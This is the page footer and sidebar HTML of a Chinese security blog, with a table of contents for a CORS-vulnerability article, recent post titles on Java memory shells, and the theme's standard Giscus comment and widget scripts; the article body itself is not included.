class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="giscus-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/image/1.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"></div><div class="author-info-name">红烧花园宝宝</div><div class="author-info-description">生命只有一次,我只能爱你一世</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">56</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/LXu2n/LXu2n.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的博客</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CORS"><span class="toc-number">2.</span> <span class="toc-text">CORS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5"><span class="toc-number">2.1.</span> <span class="toc-text">概念</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5"><span class="toc-number">2.1.1.</span> <span class="toc-text">同源策略</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CORS-1"><span class="toc-number">2.1.2.</span> <span class="toc-text">CORS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CORS%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.1.2.1.</span> <span class="toc-text">CORS漏洞</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%A0%B8%E5%BF%83"><span class="toc-number">2.2.</span> <span class="toc-text">漏洞的核心</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">2.3.</span> <span class="toc-text">漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CORS%E7%9A%84%E8%BF%9B%E9%98%B6"><span class="toc-number">3.</span> <span class="toc-text">CORS的进阶</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CORS%E7%BB%93%E5%90%88XSS"><span class="toc-number">3.1.</span> <span class="toc-text">CORS结合XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8ECORS%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">3.2.</span> <span class="toc-text">关于CORS的绕过</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">4.</span> <span class="toc-text">参考</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/873dd98/" title="CORS漏洞">CORS漏洞</a><time datetime="2026-02-24T05:55:04.000Z" title="发表于 2026-02-24 13:55:04">2026-02-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/f0486b72/" title="java内存马_6">java内存马_6</a><time datetime="2026-02-23T06:31:15.000Z" title="发表于 2026-02-23 14:31:15">2026-02-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/69413ac8/" title="java内存马_5">java内存马_5</a><time datetime="2026-02-22T12:36:11.000Z" title="发表于 2026-02-22 20:36:11">2026-02-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/1e460a5e/" title="java内存马_4">java内存马_4</a><time datetime="2026-02-19T14:58:21.000Z" title="发表于 2026-02-19 22:58:21">2026-02-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/80229ffd/" title="java内存马_3">java内存马_3</a><time datetime="2026-02-10T15:05:16.000Z" title="发表于 2026-02-10 23:05:16">2026-02-10</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">©2025 - 2026 By 红烧花园宝宝</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.0-b2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = null
+
+  const getGiscusTheme = theme => theme === 'dark' ? 'dark' : 'light'
+
+  const createScriptElement = config => {
+    const ele = document.createElement('script')
+    Object.entries(config).forEach(([key, value]) => {
+      ele.setAttribute(key, value)
+    })
+    return ele
+  }
+
+  const loadGiscus = (el = document, key) => {
+    const mappingConfig = isShuoshuo
+      ? { 'data-mapping': 'specific', 'data-term': key }
+      : { 'data-mapping': (option && option['data-mapping']) || 'pathname' }
+
+    const giscusConfig = {
+      src: 'https://giscus.app/client.js',
+      'data-repo': 'LXu2n/LXu2n.github.io',
+      'data-repo-id': 'R_kgDOOuja2g',
+      'data-category-id': 'DIC_kwDOOuja2s4C020T',
+      'data-theme': getGiscusTheme(document.documentElement.getAttribute('data-theme')),
+      'data-reactions-enabled': '1',
+      crossorigin: 'anonymous',
+      async: true,
+      ...option,
+      ...mappingConfig
+    }
+
+    const scriptElement = createScriptElement(giscusConfig)
+
+    el.querySelector('#giscus-wrap').appendChild(scriptElement)
+
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyGiscus = () => {
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+  }
+
+  const changeGiscusTheme = theme => {
+    const iframe = document.querySelector('#giscus-wrap iframe')
+    if (iframe) {
+      const message = {
+        giscus: {
+          setConfig: {
+            theme: getGiscusTheme(theme)
+          }
+        }
+      }
+      iframe.contentWindow.postMessage(message, 'https://giscus.app')
+    }
+  }
+
+  btf.addGlobalFn('themeChange', changeGiscusTheme, 'giscus')
+
+  if (isShuoshuo) {
+    'Giscus' === 'Giscus'
+      ? window.shuoshuoComment = { loadComment: loadGiscus }
+      : window.loadOtherComment = loadGiscus
+    return
+  }
+
+  if ('Giscus' === 'Giscus' || !false) {
+    if (false) btf.loadComment(document.getElementById('giscus-wrap'), loadGiscus)
+    else loadGiscus()
+  } else {
+    window.loadOtherComment = loadGiscus
+  }
+})()</script></div><script defer="" src="/js/bubble.js"></script><script src="/styles/fish.js"></script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><script async="" data-pjax="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"></div></div><hr><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body></html>
